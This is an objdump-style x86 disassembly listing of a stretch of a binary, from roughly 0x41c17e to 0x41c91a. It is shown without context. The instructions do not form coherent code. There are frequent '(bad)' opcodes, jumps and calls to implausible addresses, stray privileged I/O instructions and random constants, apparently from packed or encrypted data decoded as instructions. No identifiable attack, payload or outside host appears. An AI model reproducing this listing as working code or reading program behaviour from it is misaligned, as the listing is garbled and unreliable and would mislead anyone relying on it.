  41c17e:	add    DWORD PTR [eax+0x10],0xffffffde
  41c182:	dec    ebx
  41c183:	push   eax
  41c184:	mov    edi,0x9267c0bc
  41c189:	(bad)  
  41c18a:	dec    ebx
  41c18b:	sbb    DWORD PTR [esi],esi
  41c18d:	push   ds
  41c18e:	pop    ecx
  41c18f:	push   0x7c
  41c191:	stos   BYTE PTR es:[edi],al
  41c192:	dec    ebp
  41c193:	icebp  
  41c194:	add    eax,DWORD PTR [edx-0x7430849f]
  41c19a:	pop    esp
  41c19b:	retf   0x81ab
  41c19e:	fidiv  DWORD PTR [edi+0x36774cf2]
  41c1a4:	in     al,0x8
  41c1a6:	sub    BYTE PTR [edi],0x97
  41c1a9:	mov    ebp,0x64ed2454
  41c1ae:	mov    cl,0xc1
  41c1b0:	ds push edi
  41c1b2:	ins    DWORD PTR es:[edi],dx
  41c1b3:	xchg   ecx,eax
  41c1b4:	or     BYTE PTR [eax+0x76],0x10
  41c1b8:	jecxz  0x41c1bd
  41c1ba:	and    bh,BYTE PTR [eax+eax*2]
  41c1bd:	pop    eax
  41c1be:	cmp    BYTE PTR [edi+0x39941050],0xcd
  41c1c5:	shr    edx,1
  41c1c7:	pop    ebp
  41c1c8:	push   ecx
  41c1c9:	xor    ecx,DWORD PTR [edx+0x2c]
  41c1cc:	(bad)  
  41c1cd:	repz sub BYTE PTR [ecx+edx*2+0x79],dl
  41c1d2:	test   DWORD PTR [esi-0x2fa746e7],esi
  41c1d8:	ja     0x41c1b3
  41c1da:	xlat   BYTE PTR ds:[ebx]
  41c1db:	sbb    BYTE PTR [esi],ah
  41c1dd:	sub    al,0x79
  41c1df:	cmp    bh,BYTE PTR [ebx-0x34a9361]
  41c1e5:	mov    al,ds:0xdca1ae8c
  41c1ea:	test   al,0xc
  41c1ec:	dec    edi
  41c1ed:	inc    esp
  41c1ee:	jg     0x41c1f3
  41c1f0:	scas   al,BYTE PTR es:[edi]
  41c1f1:	inc    edx
  41c1f2:	lock jmp 0x41c1ba
  41c1f5:	inc    edi
  41c1f6:	mov    ecx,0x94a11144
  41c1fb:	ret    
  41c1fc:	sub    eax,0xe3047569
  41c201:	jmp    0x8828b285
  41c206:	xor    al,0xf2
  41c208:	pop    edx
  41c209:	(bad)  
  41c20a:	call   0xa16e77f5
  41c20f:	push   edi
  41c210:	fmul   DWORD PTR ds:0xb47045b7
  41c216:	ja     0x41c222
  41c218:	xor    ebp,DWORD PTR [eax]
  41c21a:	xlat   BYTE PTR ds:[ebx]
  41c21b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c21c:	sbb    al,0x8
  41c21e:	cmp    eax,0xf4b1ece1
  41c223:	mov    BYTE PTR [edx+0x25d62351],cl
  41c229:	push   ecx
  41c22a:	xchg   ecx,eax
  41c22b:	fs call 0x31bcb8af
  41c231:	sbb    eax,0xae6cf656
  41c236:	and    esp,DWORD PTR [esi-0x1a]
  41c239:	fs mov dl,0x2e
  41c23c:	ret    
  41c23d:	dec    eax
  41c23e:	push   ebx
  41c23f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c240:	dec    eax
  41c241:	je     0x41c1ee
  41c243:	dec    ebp
  41c244:	cmp    al,dh
  41c246:	cmp    DWORD PTR [ebp+0x62],edx
  41c249:	repz es imul esi
  41c24d:	(bad)  
  41c24f:	xchg   edi,eax
  41c250:	add    ebx,ebx
  41c252:	aam    0x6c
  41c254:	pop    edi
  41c255:	mov    dh,0x6e
  41c257:	pop    eax
  41c258:	pop    esp
  41c259:	sahf   
  41c25a:	pop    ebx
  41c25b:	scas   al,BYTE PTR es:[edi]
  41c25c:	push   0x75ce2031
  41c261:	bound  esp,QWORD PTR [esp+ecx*8]
  41c264:	retf   
  41c265:	add    eax,0xccf72739
  41c26a:	jo     0x41c2c4
  41c26c:	sbb    bh,BYTE PTR [ecx-0x23427e36]
  41c272:	xchg   edi,eax
  41c273:	and    esi,esp
  41c275:	pushf  
  41c276:	sbb    esp,DWORD PTR [esi-0x5c]
  41c279:	fld    st(6)
  41c27b:	xchg   ebp,eax
  41c27c:	imul   DWORD PTR [esi]
  41c27e:	sbb    BYTE PTR [esi],bh
  41c280:	pushf  
  41c281:	lahf   
  41c282:	jne    0x41c245
  41c284:	out    0x1b,eax
  41c286:	sar    DWORD PTR fs:[ecx],cl
  41c289:	xor    eax,0x26564277
  41c28e:	xchg   BYTE PTR [esi],dh
  41c290:	cli    
  41c291:	mov    cl,0x44
  41c294:	clc    
  41c295:	jg     0x41c2f9
  41c297:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c298:	mov    ebx,0x41a202c6
  41c29d:	jne    0x41c279
  41c29f:	pop    ds
  41c2a0:	cmp    esp,DWORD PTR [edi]
  41c2a2:	push   ebp
  41c2a3:	retf   
  41c2a4:	mov    cl,0x85
  41c2a6:	jb     0x41c22d
  41c2a8:	xchg   WORD PTR [ecx],si
  41c2ab:	test   DWORD PTR [edi+ebp*8],esp
  41c2ae:	shr    DWORD PTR [edi-0x7438d778],1
  41c2b4:	into   
  41c2b5:	mov    eax,0x2a6a4048
  41c2ba:	(bad)
  41c2be:	pushf  
  41c2bf:	inc    ebp
  41c2c0:	jbe    0x41c2e0
  41c2c2:	addr16 in al,dx
  41c2c4:	sub    BYTE PTR [esi],al
  41c2c6:	and    bl,cl
  41c2c8:	(bad)  
  41c2c9:	mov    al,0xa7
  41c2cb:	out    dx,al
  41c2cc:	jb     0x41c2e1
  41c2ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2cf:	mov    ch,0x36
  41c2d1:	or     eax,0x84b94797
  41c2d6:	cli    
  41c2d7:	fcomp  st(0)
  41c2d9:	sub    eax,0xc8820385
  41c2de:	neg    BYTE PTR [edi-0x11]
  41c2e1:	ror    DWORD PTR [eax+eiz*1-0x6],cl
  41c2e5:	retf   0x6c47
  41c2e8:	fsubr  DWORD PTR [edi+0x676d81b4]
  41c2ee:	outs   dx,DWORD PTR ds:[esi]
  41c2ef:	popa   
  41c2f0:	dec    edi
  41c2f1:	jmp    0x56bd8138
  41c2f6:	or     al,0xfb
  41c2f8:	xor    esp,DWORD PTR ds:0x9bdbff36
  41c2fe:	xchg   ebp,eax
  41c2ff:	mov    ebp,0xa6396c33
  41c304:	call   0x56a43173
  41c309:	push   esi
  41c30a:	push   ebx
  41c30b:	mov    bh,0x1
  41c30d:	nop
  41c30e:	ret    
  41c30f:	into   
  41c310:	adc    al,0xec
  41c312:	mov    ebp,0xe41c538a
  41c317:	adc    DWORD PTR [edi],edx
  41c319:	pop    edi
  41c31a:	mul    BYTE PTR [edi+0x45]
  41c31d:	push   ss
  41c31e:	and    al,0x4d
  41c320:	es dec edx
  41c322:	fstp   QWORD PTR [esi]
  41c324:	scas   eax,DWORD PTR es:[edi]
  41c325:	arpl   WORD PTR [ebp-0x6f],si
  41c328:	retf   0x59b7
  41c32b:	xor    eax,0x7734da0b
  41c330:	imul   ecx,DWORD PTR [esi+eiz*2-0x42],0xf2b7d755
  41c338:	fwait
  41c339:	popa   
  41c33a:	cmp    bh,BYTE PTR [edx-0x26]
  41c33d:	push   esp
  41c33e:	arpl   dx,bp
  41c340:	int3   
  41c341:	add    ebx,DWORD PTR [ebp-0x50695a1d]
  41c347:	or     esi,DWORD PTR [ebx+0x56]
  41c34a:	imul   ebx,DWORD PTR [eax-0x6d81f275],0x33
  41c351:	inc    edi
  41c352:	retf   
  41c353:	inc    ebx
  41c354:	push   esp
  41c355:	std    
  41c356:	fadd   DWORD PTR [edi+ebp*8-0x29e1a036]
  41c35d:	sub    eax,0xc3fe76fb
  41c362:	out    dx,al
  41c363:	cmc    
  41c364:	lea    ecx,[ecx+ecx*4-0x51d79447]
  41c36b:	xor    BYTE PTR [edi+0x12],dl
  41c36e:	in     eax,0x4c
  41c370:	nop
  41c371:	sbb    al,0x3c
  41c373:	pop    edx
  41c374:	dec    eax
  41c375:	hlt    
  41c376:	pushf  
  41c377:	pop    edx
  41c378:	mov    ecx,0x7759de51
  41c37d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c37e:	sbb    al,dh
  41c380:	stc    
  41c381:	arpl   WORD PTR [ebx-0x3c8eda7e],si
  41c387:	lock mov eax,ds:0x11bd5585
  41c38d:	shr    DWORD PTR [esi-0x4c1b3e2],cl
  41c393:	pop    edx
  41c394:	test   BYTE PTR [eax+eiz*1-0x3b],0x43
  41c399:	lea    edx,[ecx+0x298c433b]
  41c39f:	fimul  WORD PTR [ebp+0x46940af4]
  41c3a5:	pop    es
  41c3a6:	adc    BYTE PTR [eax],ch
  41c3a8:	(bad)
  41c3ab:	test   DWORD PTR [edx],edx
  41c3ad:	xchg   ebp,eax
  41c3ae:	cli    
  41c3af:	xor    ah,ah
  41c3b1:	mov    al,0x6
  41c3b3:	stos   BYTE PTR es:[edi],al
  41c3b4:	addr16 sub al,0x82
  41c3b7:	inc    ebp
  41c3b8:	call   0xd7ef:0x7cd0d697
  41c3bf:	call   0x4008:0x5b9ea2d1
  41c3c6:	std    
  41c3c7:	mov    ebp,DWORD PTR [edx-0x29]
  41c3ca:	xchg   esi,edx
  41c3cc:	fcomp  DWORD PTR [ebx-0x6b01356c]
  41c3d2:	ss ror bh,1
  41c3d5:	add    BYTE PTR [eax+0x64],ch
  41c3d8:	(bad)  
  41c3d9:	fdivr  DWORD PTR ds:0xf45c2b1c
  41c3df:	nop
  41c3e0:	lahf   
  41c3e1:	clc    
  41c3e2:	ds pop esi
  41c3e4:	add    ecx,esi
  41c3e6:	ficom  DWORD PTR [esi+esi*1-0x4e]
  41c3ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3eb:	jae    0x41c452
  41c3ed:	jp     0x41c3c4
  41c3ef:	mul    BYTE PTR [ebp-0x3c125c7c]
  41c3f5:	sbb    eax,0x4525673b
  41c3fa:	std    
  41c3fb:	push   ecx
  41c3fc:	dec    edx
  41c3fd:	loop   0x41c44c
  41c3ff:	les    ecx,FWORD PTR [eax]
  41c401:	rol    BYTE PTR ds:0xe99edd66,0xe7
  41c408:	cwde   
  41c409:	shld   DWORD PTR [ebx+0x31],ebp,0x46
  41c40e:	mov    cs,ebp
  41c410:	in     al,dx
  41c411:	or     eax,0x8b7a326e
  41c416:	aas    
  41c417:	adc    ch,BYTE PTR [edi]
  41c419:	fs xlat BYTE PTR cs:[ebx]
  41c41c:	add    eax,0x411cf7ce
  41c421:	retf   0x96ed
  41c424:	(bad)  
  41c425:	out    0xf3,eax
  41c427:	call   0x8758e7fd
  41c42c:	not    DWORD PTR [ebx]
  41c42e:	jmp    0x8534:0x88c0f407
  41c435:	dec    ecx
  41c436:	imul   edx,DWORD PTR [ecx],0x3c663d7e
  41c43c:	aam    0xc9
  41c43e:	in     eax,dx
  41c43f:	sub    DWORD PTR cs:[esi],esp
  41c442:	adc    dh,bh
  41c444:	sub    al,dh
  41c446:	or     dh,BYTE PTR [ebx]
  41c448:	add    eax,0xe6e7fccd
  41c44d:	push   0x37
  41c44f:	es mov dh,0x9a
  41c452:	mov    cl,0x66
  41c454:	cmp    DWORD PTR [esi],edx
  41c456:	inc    esp
  41c457:	jnp    0x41c3f2
  41c459:	sbb    BYTE PTR [edx],dh
  41c45b:	sbb    al,0x6d
  41c45d:	data16 repz (bad) 
  41c461:	jecxz  0x41c418
  41c463:	je     0x41c46f
  41c465:	imul   edx,DWORD PTR [ecx-0x14],0xfffffffe
  41c469:	push   edi
  41c46a:	(bad)  
  41c46b:	jmp    0x41c446
  41c46d:	or     eax,0xc5a144a1
  41c472:	mov    ds:0x4e2ae8f3,al
  41c477:	je     0x41c40c
  41c479:	mov    esi,0x92ce9df3
  41c47e:	in     eax,0xdf
  41c480:	push   ebx
  41c481:	hlt    
  41c482:	inc    ebx
  41c483:	cli    
  41c484:	xchg   edx,eax
  41c485:	stos   DWORD PTR es:[edi],eax
  41c486:	cmp    bl,BYTE PTR [edi-0x74]
  41c489:	or     DWORD PTR [edx],ebx
  41c48b:	mov    al,ds:0xbb46da86
  41c490:	push   edx
  41c491:	stc    
  41c492:	cmp    DWORD PTR [ebx-0x1ae4c2de],edx
  41c498:	jle    0x41c4b9
  41c49a:	mov    cl,0x64
  41c49c:	adc    eax,0xf2442666
  41c4a1:	mov    cl,0x80
  41c4a3:	mov    ebp,0xc35f5fde
  41c4a8:	and    DWORD PTR [ebx-0x11f26c13],esi
  41c4ae:	jns    0x41c4c9
  41c4b0:	in     eax,0xb1
  41c4b2:	test   BYTE PTR [ecx+0x42a32801],bh
  41c4b8:	mov    ds:0xf2b69264,al
  41c4bd:	mov    dl,0x7a
  41c4bf:	mov    ebx,0x3ab545cd
  41c4c4:	sub    BYTE PTR [ebx-0x7ecc9ef7],ah
  41c4ca:	out    0x3e,al
  41c4cc:	pop    es
  41c4cd:	push   0xd718c2b1
  41c4d2:	pop    es
  41c4d3:	popf   
  41c4d4:	jnp    0x41c548
  41c4d6:	mov    dh,0x34
  41c4d8:	sub    edi,DWORD PTR [edx]
  41c4da:	(bad)  
  41c4db:	pop    ebp
  41c4dc:	aas    
  41c4dd:	stos   DWORD PTR es:[edi],eax
  41c4de:	xchg   ecx,eax
  41c4df:	jp     0x41c4e4
  41c4e1:	xor    BYTE PTR [ebp+ebx*2-0x25],bl
  41c4e5:	mov    bh,0x1
  41c4e7:	mov    ch,0xba
  41c4e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4ea:	aad    0x12
  41c4ec:	(bad)  
  41c4ed:	inc    BYTE PTR [ebx-0x10f348bc]
  41c4f3:	out    0x32,eax
  41c4f5:	shr    DWORD PTR [edx],1
  41c4f7:	cmp    DWORD PTR [eax+0x5262ff0c],0xffffffb4
  41c4fe:	ror    DWORD PTR [ebp+0x61],0xb8
  41c502:	add    eax,0xe00964da
  41c507:	or     al,0x2f
  41c509:	out    dx,al
  41c50a:	test   eax,0x6aa01e02
  41c50f:	pop    ss
  41c510:	pop    ebx
  41c511:	stos   BYTE PTR es:[edi],al
  41c512:	cld    
  41c513:	cmp    DWORD PTR [ebx+ebx*4+0xd],esi
  41c517:	aam    0x9e
  41c519:	nop
  41c51a:	jnp    0x41c4ba
  41c51c:	shr    ah,1
  41c51e:	jmp    ebx
  41c520:	mov    ecx,0xcb96ebcc
  41c525:	aaa    
  41c526:	push   edx
  41c527:	(bad)  
  41c528:	adc    edi,esp
  41c52a:	mov    al,ds:0x72ab593e
  41c52f:	mov    ds:0x3f491e85,eax
  41c534:	cmp    ebx,ebx
  41c536:	daa    
  41c537:	or     al,0x30
  41c539:	mov    edi,0xb72252b1
  41c53e:	mov    edi,0xe5cab1a
  41c543:	pop    edx
  41c544:	lods   al,BYTE PTR ds:[esi]
  41c545:	mov    dh,0x12
  41c547:	aad    0x3c
  41c549:	aam    0xaf
  41c54b:	ins    DWORD PTR es:[edi],dx
  41c54c:	fnstenv [ebp-0x63c54067]
  41c552:	in     al,0x2f
  41c554:	jmp    0x41c5b4
  41c556:	out    0x2d,al
  41c558:	pop    edx
  41c559:	mov    cs,WORD PTR [esi+0x2435cac4]
  41c55f:	sub    eax,0x5fcbcb59
  41c564:	hlt    
  41c565:	test   BYTE PTR [eax+0x58eab726],ch
  41c56b:	int    0xd4
  41c56d:	jge    0x41c5da
  41c56f:	push   0xffffffa7
  41c571:	push   eax
  41c572:	sub    ecx,edx
  41c574:	loop   0x41c567
  41c576:	push   0x2cdf6d34
  41c57b:	je     0x41c5b2
  41c57d:	pop    ebx
  41c57e:	ins    BYTE PTR es:[edi],dx
  41c57f:	sbb    eax,DWORD PTR [ebx-0xaed85bb]
  41c585:	xor    cl,cl
  41c587:	jmp    0x7cff:0x45794ad1
  41c58e:	dec    ecx
  41c58f:	mov    BYTE PTR [ecx+ebx*2+0x3a35920f],bl
  41c596:	popf   
  41c597:	mov    WORD PTR [esi-0x6775e19c],?
  41c59d:	js     0x41c57c
  41c59f:	mov    eax,0x7ca799ec
  41c5a4:	adc    al,0xb4
  41c5a6:	into   
  41c5a7:	push   eax
  41c5a8:	sub    ebp,esi
  41c5aa:	outs   dx,BYTE PTR ds:[esi]
  41c5ab:	xor    al,0x27
  41c5ad:	xchg   ecx,eax
  41c5ae:	mov    dl,0x27
  41c5b0:	adc    al,0x84
  41c5b2:	jge    0x41c559
  41c5b4:	jmp    0x716bd939
  41c5b9:	mov    esp,0x29c7cf96
  41c5be:	cwde   
  41c5bf:	jg     0x41c63b
  41c5c1:	jmp    0xa11:0xf0f027db
  41c5c8:	rol    ecx,0x72
  41c5cb:	scas   al,BYTE PTR es:[edi]
  41c5cc:	mov    ebp,0x9be59152
  41c5d1:	dec    edx
  41c5d2:	std    
  41c5d3:	je     0x41c5dd
  41c5d5:	scas   al,BYTE PTR es:[edi]
  41c5d6:	imul   ebp,DWORD PTR [edi-0x63],0x7c
  41c5da:	jne    0x41c636
  41c5dc:	sar    BYTE PTR [ebp-0x4dd2f566],0x43
  41c5e3:	clc    
  41c5e4:	lea    ecx,[ebp+0x20]
  41c5e7:	adc    BYTE PTR [eax-0xe],0x75
  41c5eb:	pop    ebp
  41c5ec:	push   eax
  41c5ed:	cwde   
  41c5ee:	out    dx,eax
  41c5ef:	sbb    DWORD PTR [esi+edx*4-0x5770fa1f],ebx
  41c5f6:	and    BYTE PTR [ebp-0x80],cl
  41c5f9:	xchg   ebx,eax
  41c5fa:	dec    ebp
  41c5fb:	sti    
  41c5fc:	pop    ss
  41c5fd:	les    esp,FWORD PTR [ecx]
  41c5ff:	(bad)  
  41c600:	pop    esp
  41c601:	jne    0x41c5e5
  41c603:	mov    dh,0x93
  41c605:	cmp    DWORD PTR [edi-0x45deb9da],0xffffffa9
  41c60c:	inc    eax
  41c60d:	sbb    al,0x31
  41c60f:	ret    
  41c610:	jmp    0x1fc4:0x7327f98d
  41c617:	mov    dl,0xd2
  41c619:	fidiv  WORD PTR ds:0xb395a710
  41c61f:	pop    edi
  41c620:	adc    BYTE PTR [ebp-0x7a],0x69
  41c624:	fmul   QWORD PTR [ebp+0x21]
  41c627:	xor    DWORD PTR [ebp+0x24],ebp
  41c62a:	in     al,dx
  41c62b:	xor    cl,ah
  41c62d:	fistp  DWORD PTR [ecx]
  41c62f:	int3   
  41c630:	(bad)  
  41c631:	sub    esi,DWORD PTR [ecx+0x545da170]
  41c637:	sub    al,0x61
  41c639:	mov    edi,0x46959857
  41c63e:	cmp    cl,bh
  41c640:	xor    DWORD PTR ds:0x103c7955,ecx
  41c646:	imul   eax,DWORD PTR [ecx],0xf8939f56
  41c64c:	mov    BYTE PTR [eax+0x60],bh
  41c64f:	and    eax,0xc119b0bd
  41c654:	jg     0x41c628
  41c656:	in     al,0x65
  41c658:	mov    ecx,0xb4c57025
  41c65d:	ins    BYTE PTR es:[edi],dx
  41c65e:	and    ebx,DWORD PTR [ebx+0x365f4667]
  41c664:	daa    
  41c665:	es aas 
  41c667:	adc    ah,BYTE PTR [edx-0x67]
  41c66a:	push   edx
  41c66b:	xor    DWORD PTR [ebp-0x5d],ebp
  41c66e:	mov    bl,BYTE PTR [edi-0x3ee0b6bc]
  41c674:	jae    0x41c668
  41c676:	and    ebx,DWORD PTR [ecx]
  41c678:	push   0xa0a11433
  41c67d:	sbb    DWORD PTR [edi+0xd43623b],0xffffffa6
  41c684:	add    DWORD PTR [esi],ebp
  41c686:	pusha  
  41c687:	fucomp st(5)
  41c689:	popa   
  41c68a:	ud2    
  41c68c:	lods   eax,DWORD PTR ds:[esi]
  41c68d:	mov    ecx,0x9d435bd9
  41c692:	xchg   ebp,eax
  41c693:	adc    DWORD PTR [eax-0x4845a704],0xae96904d
  41c69d:	gs iret 
  41c69f:	jne    0x41c6dc
  41c6a1:	arpl   sp,si
  41c6a3:	jne    0x41c642
  41c6a5:	enter  0x3554,0xc4
  41c6a9:	push   ss
  41c6aa:	xor    al,0x31
  41c6ac:	neg    DWORD PTR [ebx+0x1398198f]
  41c6b2:	imul   esp,DWORD PTR [eax],0x68
  41c6b5:	pop    esp
  41c6b6:	ja     0x41c64f
  41c6b8:	sar    DWORD PTR [edx],0x5c
  41c6bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6bc:	sbb    DWORD PTR [esi+ebp*4-0x61272647],ebp
  41c6c3:	je     0x41c718
  41c6c5:	adc    eax,DWORD PTR [esi-0xe]
  41c6c8:	push   0xffffffd3
  41c6ca:	rcl    DWORD PTR [eax],cl
  41c6cc:	scas   eax,DWORD PTR es:[edi]
  41c6cd:	scas   eax,DWORD PTR es:[edi]
  41c6ce:	xchg   edi,eax
  41c6cf:	cmp    bh,dh
  41c6d1:	daa    
  41c6d2:	pop    ecx
  41c6d3:	add    esi,DWORD PTR [ebx]
  41c6d5:	cdq    
  41c6d6:	jl     0x41c6fa
  41c6d8:	sbb    esp,edx
  41c6da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6db:	les    edi,FWORD PTR [edx-0x31]
  41c6de:	or     ch,cl
  41c6e0:	cmp    eax,0x156a178d
  41c6e5:	mov    cl,0x92
  41c6e7:	out    0xde,al
  41c6e9:	push   esp
  41c6ea:	call   0xba032e68
  41c6ef:	push   es
  41c6f0:	adc    esi,DWORD PTR [eax-0x3f612c28]
  41c6f6:	jae    0x41c775
  41c6f8:	icebp  
  41c6f9:	jbe    0x41c779
  41c6fb:	scas   eax,DWORD PTR es:[edi]
  41c6fc:	cmc    
  41c6fd:	or     al,0x73
  41c6ff:	inc    edi
  41c700:	mov    edi,0x8e0dddb4
  41c705:	sub    dh,BYTE PTR [esi-0x46]
  41c708:	cmc    
  41c709:	pop    esi
  41c70a:	pop    ds
  41c70b:	xor    BYTE PTR fs:[ebx-0x3b],dh
  41c70f:	mov    edx,0x4db97ccd
  41c714:	add    dl,BYTE PTR [eax]
  41c716:	(bad)  
  41c717:	repnz leave 
  41c719:	loope  0x41c719
  41c71b:	pop    esi
  41c71c:	rcl    BYTE PTR [ebx],cl
  41c71e:	xchg   ebx,eax
  41c71f:	fadd   DWORD PTR [edx]
  41c721:	and    DWORD PTR [edi-0x9d0bc6d],edi
  41c727:	fld    QWORD PTR [ebp+0x2b]
  41c72a:	mov    ebp,DWORD PTR [edi+0x46c8e923]
  41c730:	repnz sbb DWORD PTR [ecx-0x7ef8f9d3],edi
  41c737:	mov    bh,0x5b
  41c739:	dec    ebx
  41c73a:	aas    
  41c73b:	add    eax,0xf29a33d
  41c740:	rol    DWORD PTR [ecx-0x31],cl
  41c743:	aas    
  41c744:	lea    ecx,[eax+eax*8]
  41c747:	cmp    edx,DWORD PTR [ecx]
  41c749:	pusha  
  41c74a:	mul    BYTE PTR [eax]
  41c74c:	sbb    ah,ah
  41c74e:	add    ecx,ecx
  41c750:	dec    ebx
  41c751:	or     BYTE PTR [eax-0xb],0xff
  41c755:	scas   al,BYTE PTR es:[edi]
  41c756:	adc    BYTE PTR [ecx-0x7a195b32],bh
  41c75c:	out    0xb3,eax
  41c75e:	push   0xffffffb2
  41c760:	stos   DWORD PTR es:[edi],eax
  41c761:	adc    bh,ch
  41c763:	gs dec esp
  41c765:	in     al,dx
  41c766:	and    DWORD PTR [esp+ebx*8-0x19bdc0e3],ecx
  41c76d:	(bad)  
  41c76e:	xchg   ebx,eax
  41c76f:	sbb    BYTE PTR [ebx-0x7d15a379],ch
  41c775:	je     0x41c737
  41c777:	push   cs
  41c778:	mov    ebp,0xe12ca998
  41c77d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c77e:	int3   
  41c77f:	mov    ds:0x401f16a5,al
  41c784:	cli    
  41c785:	cmp    DWORD PTR [eax+0x58],0xffffffd4
  41c789:	xchg   ebp,eax
  41c78a:	adc    DWORD PTR [ebp-0x6a],esi
  41c78d:	mov    eax,ds:0x334a04dd
  41c792:	adc    BYTE PTR [edi-0x2963517c],al
  41c798:	int3   
  41c799:	retf   0xfbdb
  41c79c:	mov    esi,DWORD PTR [ebp+0x38]
  41c79f:	mov    ch,0xcf
  41c7a1:	scas   al,BYTE PTR es:[edi]
  41c7a2:	or     BYTE PTR [edi+0xc],ah
  41c7a5:	es mov dh,cl
  41c7a8:	mov    BYTE PTR [ecx+0x65],cl
  41c7ab:	mov    es,WORD PTR [esi]
  41c7ad:	fwait
  41c7ae:	gs cmp BYTE PTR cs:[ebp+0x51],dl
  41c7b3:	je     0x41c798
  41c7b5:	shl    ebp,1
  41c7b7:	(bad)  
  41c7b8:	retf   
  41c7b9:	sbb    esi,DWORD PTR [edx+0x24d40f7d]
  41c7bf:	jne    0x41c80e
  41c7c1:	mov    cl,0x7e
  41c7c3:	pop    ss
  41c7c4:	or     BYTE PTR [eax-0x43c9881d],al
  41c7ca:	adc    esi,eax
  41c7cc:	pop    esi
  41c7cd:	dec    eax
  41c7ce:	imul   ecx
  41c7d0:	xor    dh,BYTE PTR ds:0x40733ff5
  41c7d6:	or     dl,BYTE PTR [eax+0x30be781a]
  41c7dc:	adc    ch,BYTE PTR fs:[edi+0x1d]
  41c7e0:	jnp    0x41c79e
  41c7e2:	cmp    al,0x8f
  41c7e4:	or     DWORD PTR ds:0x90f759a5,0x12
  41c7eb:	xor    bl,BYTE PTR [esp+edi*2+0x4c]
  41c7ef:	enter  0x1c6f,0xd0
  41c7f3:	test   eax,0xf8d562a4
  41c7f8:	push   0xf3b85a3f
  41c7fd:	cmp    al,BYTE PTR [esi+edx*4]
  41c800:	pop    ebx
  41c801:	(bad)  
  41c802:	loop   0x41c858
  41c804:	ja     0x41c846
  41c806:	aad    0x67
  41c808:	mov    eax,ds:0xd5eb9b4a
  41c80d:	popf   
  41c80e:	ror    DWORD PTR [edi],0xdb
  41c811:	jecxz  0x41c7da
  41c813:	retf   0x355
  41c816:	push   0xffffff95
  41c818:	lods   al,BYTE PTR ds:[esi]
  41c819:	mov    esi,0xa1cf8524
  41c81e:	mov    bh,0xaa
  41c820:	test   BYTE PTR [eax],al
  41c822:	test   eax,0x22ff4124
  41c827:	jge    0x41c819
  41c829:	and    bh,0xa
  41c82c:	mov    ecx,0x36d7b330
  41c831:	lods   al,BYTE PTR ds:[esi]
  41c832:	(bad)  
  41c833:	jae    0x41c7d9
  41c835:	jle    0x41c7c8
  41c837:	mov    ecx,ss
  41c839:	das    
  41c83a:	lods   eax,DWORD PTR ds:[esi]
  41c83b:	fcmove st,st(5)
  41c83d:	out    dx,al
  41c83e:	js     0x41c7c0
  41c840:	xor    al,0xef
  41c843:	fnstenv [ebx+0x518b7d80]
  41c849:	ja     0x41c88f
  41c84b:	dec    edx
  41c84c:	imul   ecx,DWORD PTR [ecx-0x1a],0x7d
  41c850:	stos   DWORD PTR es:[edi],eax
  41c851:	mov    edi,cs
  41c853:	pusha  
  41c854:	test   al,0xce
  41c856:	xchg   ebx,eax
  41c857:	mov    WORD PTR [eax-0x18b46018],ss
  41c85d:	lods   eax,DWORD PTR ds:[esi]
  41c85e:	adc    dl,bl
  41c860:	push   0xa1ca0ab5
  41c865:	bswap  ebp
  41c867:	mov    DWORD PTR [ecx+edx*4],ebx
  41c86a:	out    dx,al
  41c86b:	mov    ds:0xc98b94ff,al
  41c870:	sbb    dh,dl
  41c872:	loop   0x41c845
  41c874:	adc    esi,ebx
  41c876:	mov    ah,bl
  41c878:	sbb    eax,0xcec9f584
  41c87d:	ds ret 0x977b
  41c881:	nop
  41c882:	push   0xf397c58b
  41c887:	dec    esp
  41c888:	out    0x1a,eax
  41c88a:	pop    eax
  41c88b:	pushf  
  41c88c:	imul   ecx,edx,0xbbee34ff
  41c892:	inc    edx
  41c893:	cmp    DWORD PTR [ebx-0x50],0x14
  41c897:	les    edi,FWORD PTR [ebp-0x6d]
  41c89a:	mov    al,ds:0x520274f5
  41c89f:	ins    BYTE PTR es:[edi],dx
  41c8a0:	xor    DWORD PTR [edx+edx*1+0x2eb6d23a],ebx
  41c8a7:	push   edi
  41c8a8:	aaa    
  41c8a9:	mov    ah,0x47
  41c8ab:	mov    DWORD PTR [edi],ebp
  41c8ad:	jno    0x41c88c
  41c8af:	gs clc 
  41c8b1:	xchg   DWORD PTR [ecx],ebx
  41c8b3:	sub    esp,DWORD PTR [ebp-0x23]
  41c8b6:	inc    esi
  41c8b7:	add    cl,BYTE PTR [eax-0x16eb91fd]
  41c8bd:	gs jbe 0x41c913
  41c8c0:	outs   dx,DWORD PTR ds:[esi]
  41c8c1:	jl     0x41c92e
  41c8c3:	bound  eax,QWORD PTR [ecx-0x19099a48]
  41c8c9:	jmp    0x5ef4dc6d
  41c8ce:	aam    0x66
  41c8d0:	jmp    0x41c926
  41c8d2:	xchg   edi,eax
  41c8d3:	push   0xde4b4545
  41c8d8:	shl    DWORD PTR [ebx+ebp*2-0x50],0x19
  41c8dd:	nop
  41c8de:	iret   
  41c8df:	lds    esp,FWORD PTR [esi+0x5febaa60]
  41c8e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8e6:	xor    BYTE PTR [eax-0x378eda45],al
  41c8ec:	jns    0x41c8c2
  41c8ee:	int3   
  41c8ef:	lds    edx,FWORD PTR [edi]
  41c8f1:	xchg   DWORD PTR [ebp-0x72c78391],ecx
  41c8f7:	xor    al,0x7c
  41c8f9:	ret    0xcbb1
  41c8fc:	jb     0x41c8f8
  41c8fe:	xor    al,0xae
  41c900:	mov    ebx,0x2163a07b
  41c905:	stos   BYTE PTR es:[edi],al
  41c906:	call   0xb86a4996
  41c90b:	and    ebp,DWORD PTR [edi+0x2a]
  41c90e:	gs sbb ecx,esp
  41c911:	into   
  41c912:	adc    ebp,DWORD PTR [ebx-0x66]
  41c915:	mov    ecx,0xeab2f366
  41c91a:	adc    BYTE PTR [eax-0xa8c6b3c],ch
